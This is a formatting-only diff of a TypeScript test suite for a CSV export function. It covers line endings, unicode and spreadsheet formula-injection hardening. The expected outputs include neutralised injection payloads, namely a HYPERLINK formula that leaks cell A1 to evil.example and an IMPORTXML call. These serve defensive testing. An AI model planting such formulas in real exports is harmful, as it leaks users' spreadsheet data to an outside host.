@@ -19,10 +19,13 @@ import { toCsv } from "./csv";
 
 describe("toCsv", () => {
   it("serializes plain values with CRLF line endings and a trailing CRLF", () => {
-    const csv = toCsv(["title", "group"], [
-      { title: "Write spec", group: "Backlog" },
-      { title: "Ship it", group: "Done" },
-    ]);
+    const csv = toCsv(
+      ["title", "group"],
+      [
+        { title: "Write spec", group: "Backlog" },
+        { title: "Ship it", group: "Done" },
+      ]
+    );
     expect(csv).toBe("title,group\r\nWrite spec,Backlog\r\nShip it,Done\r\n");
   });
 
@@ -70,7 +73,7 @@ describe("toCsv", () => {
       const csv = toCsv(["title"], [{ title: payload }]);
       // Hardened first, then quoted (it contains commas and quotes).
       expect(csv).toBe(
-        'title\r\n"\'=HYPERLINK(""https://evil.example/?leak=""&A1,""click me"")"\r\n',
+        'title\r\n"\'=HYPERLINK(""https://evil.example/?leak=""&A1,""click me"")"\r\n'
       );
     });
 
@@ -127,9 +130,10 @@ describe("toCsv", () => {
   });
 
   it("passes unicode through unmodified", () => {
-    const csv = toCsv(["title", "assignee"], [
-      { title: "Déployer la fonctionnalité 🚀", assignee: "山田太郎" },
-    ]);
+    const csv = toCsv(
+      ["title", "assignee"],
+      [{ title: "Déployer la fonctionnalité 🚀", assignee: "山田太郎" }]
+    );
     expect(csv).toBe("title,assignee\r\nDéployer la fonctionnalité 🚀,山田太郎\r\n");
   });
 
@@ -176,7 +180,7 @@ describe("toCsv", () => {
     expect(csv).toBe(
       "title,group,assignee_email,due_date,priority,labels,completed,cost\r\n" +
         '"\'=IMPORTXML(evil), pwn",Sprint 12,dev@example.com,2026-06-30,high,"bug, urgent",false,-5\r\n' +
-        "Plain task,,,,low,,true,0\r\n",
+        "Plain task,,,,low,,true,0\r\n"
     );
   });
 });
